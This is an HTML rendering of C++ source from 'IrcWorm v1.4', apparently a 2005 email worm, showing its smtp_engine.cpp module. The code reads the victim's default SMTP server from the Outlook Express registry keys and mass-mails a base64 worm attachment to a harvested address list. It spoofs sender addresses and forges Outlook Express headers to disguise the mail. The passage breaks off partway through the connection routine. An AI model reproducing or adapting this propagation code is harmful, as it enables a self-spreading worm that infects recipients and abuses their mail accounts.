<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>IrcWorm v1.4 (CPP Sources) - smtp_engine.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">


</span><span class="sc9">#include "stdafx.h"
#include "winsock2.h"
#include "stdlib.h"
#include "smtp_engine.h"
</span><span class="sc0">
</span><span class="sc2">//smtp engine module (c) DR-EF 2005
</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">SendMails</span><span class="sc10">(</span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">maillist1</span><span class="sc0"> </span><span class="sc11">Mail_List</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">base64_image</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">b64_size</span><span class="sc10">,</span><span class="sc11">MailInfoList</span><span class="sc0"> </span><span class="sc11">MIL</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/*
        send mail to all addresses at maill list
    
        input:

            msocket - mail socket

            mail_list - mail list

            base64_image - pointer to base64 image of the attachment

            b64_size - size of the data at base64_image

            MIL - mail info list

        output:

            boolean - success/fail

    */</span><span class="sc0">
    

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mime_header</span><span class="sc10">[]=</span><span class="sc6">"From: &lt;%s&gt;\r\nSubject: %s\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed;\r\n\tboundary=\"%s\"\r\nX-Priority: 3\r\nX-MSMail-Priority: Normal\r\nX-Mailer: Microsoft Outlook Express 6.00.2800.1106\r\nX-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106\r\n\r\nThis is a multi-part message in MIME format.\r\n--%s\r\nContent-Type: text/plain;\r\n\tcharset=\"windows-1255\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\n%s\r\n--%s\r\nContent-Type: application/octet-stream;\r\n\tname= \"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment;\r\n\tfilename= \"%s\"\r\n\r\n"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc4">4096</span><span class="sc10">],</span><span class="sc11">cmdbuf</span><span class="sc10">[</span><span class="sc4">90</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">Hello</span><span class="sc10">[]=</span><span class="sc6">"HELO &lt;localhost&gt;\r\n"</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">boundry</span><span class="sc10">[]=</span><span class="sc6">"bound1"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">n_mil</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">n_mf</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">rcpt_ok</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc11">ret_val</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">

    </span><span class="sc11">retval</span><span class="sc10">=</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc11">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">   
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"220"</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">       </span><span class="sc2">//connection ok ?
</span><span class="sc0">        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">Hello</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">Hello</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// send HELO command
</span><span class="sc0">
            </span><span class="sc11">retval</span><span class="sc10">=</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc11">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"250"</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">       </span><span class="sc2">//HELO command ok ?
</span><span class="sc0">                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">n_mil</span><span class="sc10">=(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">MIL</span><span class="sc10">.</span><span class="sc11">number_of_MIL</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//pick random item from the MailInfoList
</span><span class="sc0">                    
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MIL</span><span class="sc10">.</span><span class="sc11">fake_mail_from</span><span class="sc10">==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">n_mf</span><span class="sc10">=(</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">Mail_List</span><span class="sc10">.</span><span class="sc11">number_of_mails</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">cmdbuf</span><span class="sc10">,</span><span class="sc6">"MAIL FROM:&lt;%s&gt;\r\n"</span><span class="sc10">,</span><span class="sc11">Mail_List</span><span class="sc10">.</span><span class="sc11">mail_list</span><span class="sc10">[</span><span class="sc11">n_mf</span><span class="sc10">]);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MIL</span><span class="sc10">.</span><span class="sc11">fake_mail_from</span><span class="sc10">==</span><span class="sc11">FALSE</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">cmdbuf</span><span class="sc10">,</span><span class="sc6">"MAIL FROM:&lt;%s&gt;\r\n"</span><span class="sc10">,</span><span class="sc11">MIL</span><span class="sc10">.</span><span class="sc11">mail_info_list</span><span class="sc10">[</span><span class="sc11">n_mil</span><span class="sc10">].</span><span class="sc11">mailfrom</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    
                    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">cmdbuf</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">cmdbuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// send MAIL FROM command   
</span><span class="sc0">
                    </span><span class="sc11">retval</span><span class="sc10">=</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc11">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">   
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"250"</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">       </span><span class="sc2">//MAIL FROM command ok ?
</span><span class="sc0">                        </span><span class="sc10">{</span><span class="sc0">
                            
                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Mail_List</span><span class="sc10">.</span><span class="sc11">max_mails_to_send</span><span class="sc10">&lt;</span><span class="sc11">Mail_List</span><span class="sc10">.</span><span class="sc11">number_of_mails</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc11">Mail_List</span><span class="sc10">.</span><span class="sc11">number_of_mails</span><span class="sc10">=</span><span class="sc11">Mail_List</span><span class="sc10">.</span><span class="sc11">max_mails_to_send</span><span class="sc10">;</span><span class="sc0">
                            
                            </span><span class="sc2">//start with the RCPT loop
</span><span class="sc0">
                            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">Mail_List</span><span class="sc10">.</span><span class="sc11">number_of_mails</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">cmdbuf</span><span class="sc10">,</span><span class="sc6">"RCPT TO:&lt;%s&gt;\r\n"</span><span class="sc10">,</span><span class="sc11">Mail_List</span><span class="sc10">.</span><span class="sc11">mail_list</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                                </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">cmdbuf</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">cmdbuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// send RCPT command
</span><span class="sc0">
                                </span><span class="sc11">retval</span><span class="sc10">=</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc11">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"25"</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">    </span><span class="sc2">//RCPT command ok ?
</span><span class="sc0">                                        </span><span class="sc11">rcpt_ok</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc5">else</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">rcpt_ok</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
                                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc5">else</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">rcpt_ok</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">

                            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">rcpt_ok</span><span class="sc10">==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">   </span><span class="sc2">//all RCPT commands ok ?
</span><span class="sc0">                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">cmdbuf</span><span class="sc10">,</span><span class="sc6">"DATA\r\n"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">cmdbuf</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">cmdbuf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// send DATA command
</span><span class="sc0">                                    
                                </span><span class="sc11">retval</span><span class="sc10">=</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc11">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">retval</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">

                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"354"</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">   </span><span class="sc2">// is DATA command ok ?
</span><span class="sc0">                                    </span><span class="sc10">{</span><span class="sc0">
                                        
                                        
                                        </span><span class="sc2">//set MAIL FROM
</span><span class="sc0">
                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MIL</span><span class="sc10">.</span><span class="sc11">fake_mail_from</span><span class="sc10">==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">cmdbuf</span><span class="sc10">,</span><span class="sc11">Mail_List</span><span class="sc10">.</span><span class="sc11">mail_list</span><span class="sc10">[</span><span class="sc11">n_mf</span><span class="sc10">]);</span><span class="sc0">
                                        </span><span class="sc5">else</span><span class="sc0">
                                            </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">cmdbuf</span><span class="sc10">,</span><span class="sc11">MIL</span><span class="sc10">.</span><span class="sc11">mail_info_list</span><span class="sc10">[</span><span class="sc11">n_mil</span><span class="sc10">].</span><span class="sc11">mailfrom</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc2">//set mime header
</span><span class="sc0">
                                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">mime_header</span><span class="sc10">,</span><span class="sc0">
                                            </span><span class="sc11">cmdbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc2">//set MAIL FROM
</span><span class="sc0">                                            </span><span class="sc11">MIL</span><span class="sc10">.</span><span class="sc11">mail_info_list</span><span class="sc10">[</span><span class="sc11">n_mil</span><span class="sc10">].</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0">  </span><span class="sc2">//set subject
</span><span class="sc0">                                            </span><span class="sc11">boundry</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc2">//set boundry
</span><span class="sc0">                                            </span><span class="sc11">boundry</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc2">//set boundry
</span><span class="sc0">                                            </span><span class="sc11">MIL</span><span class="sc10">.</span><span class="sc11">mail_info_list</span><span class="sc10">[</span><span class="sc11">n_mil</span><span class="sc10">].</span><span class="sc11">text</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc2">//set mail text
</span><span class="sc0">                                            </span><span class="sc11">boundry</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc2">//set boundry
</span><span class="sc0">                                            </span><span class="sc11">MIL</span><span class="sc10">.</span><span class="sc11">mail_info_list</span><span class="sc10">[</span><span class="sc11">n_mil</span><span class="sc10">].</span><span class="sc11">attachment</span><span class="sc10">,</span><span class="sc0">   </span><span class="sc2">//set attachment name
</span><span class="sc0">                                            </span><span class="sc11">MIL</span><span class="sc10">.</span><span class="sc11">mail_info_list</span><span class="sc10">[</span><span class="sc11">n_mil</span><span class="sc10">].</span><span class="sc11">attachment</span><span class="sc0">    </span><span class="sc2">//set attachment name
</span><span class="sc0">                                            </span><span class="sc10">);</span><span class="sc0">


                                        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc2">//send attachment
</span><span class="sc0">
                                        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">base64_image</span><span class="sc10">,</span><span class="sc11">b64_size</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc2">//send boundry
</span><span class="sc0">
                                        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\r\n--%s--\r\n"</span><span class="sc10">,</span><span class="sc11">boundry</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\r\n.\r\n"</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc2">//end of data
</span><span class="sc0">                                        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"250"</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc11">ret_val</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"QUIT\r\n"</span><span class="sc10">);</span><span class="sc0">         
        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">//send quit command
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">2000</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">msocket</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">ret_val</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">FindSmtp_AndConnect</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/*
        find smtp server from the registry,and connect to it

        input: none

        if fail return NULL,if success return socket of the smtp connection
         
    */</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">accountmanager</span><span class="sc10">[]=</span><span class="sc6">"Software\\Microsoft\\Internet Account Manager"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">smtp_server</span><span class="sc10">[]=</span><span class="sc6">"SMTP Server"</span><span class="sc10">,</span><span class="sc11">dma</span><span class="sc10">[]=</span><span class="sc6">"Default Mail Account"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">kbuffer</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">],</span><span class="sc11">tbuffer</span><span class="sc10">[</span><span class="sc4">70</span><span class="sc10">],</span><span class="sc11">smtpserver</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">];</span><span class="sc0">
    
    </span><span class="sc11">DWORD</span><span class="sc0">   </span><span class="sc11">v_size</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">HKEY</span><span class="sc0">    </span><span class="sc11">hkey</span><span class="sc10">,</span><span class="sc11">hkey2</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">BOOL</span><span class="sc0">    </span><span class="sc11">smtp_founded</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">WSADATA</span><span class="sc0"> </span><span class="sc11">wsd</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">retsocket</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">LPHOSTENT</span><span class="sc0"> </span><span class="sc11">hostnt</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc11">accountmanager</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_READ</span><span class="sc10">,&amp;</span><span class="sc11">hkey</span><span class="sc10">)==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">v_size</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">kbuffer</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">,</span><span class="sc11">dma</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">kbuffer</span><span class="sc10">,&amp;</span><span class="sc11">v_size</span><span class="sc10">)==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">tbuffer</span><span class="sc10">,</span><span class="sc6">"Accounts\\%s"</span><span class="sc10">,</span><span class="sc11">kbuffer</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">,</span><span class="sc11">tbuffer</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_READ</span><span class="sc10">,&amp;</span><span class="sc11">hkey2</span><span class="sc10">)==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">v_size</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">smtpserver</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hkey2</span><span class="sc10">,</span><span class="sc11">smtp_server</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">smtpserver</span><span class="sc10">,&amp;</span><span class="sc11">v_size</span><span class="sc10">)==</span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">smtp_founded</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hkey2</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hkey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">


    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">smtp_founded</span><span class="sc10">==</span><span class="sc11">FALSE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc11">MAKEWORD</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">),&amp;</span><span class="sc11">wsd</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
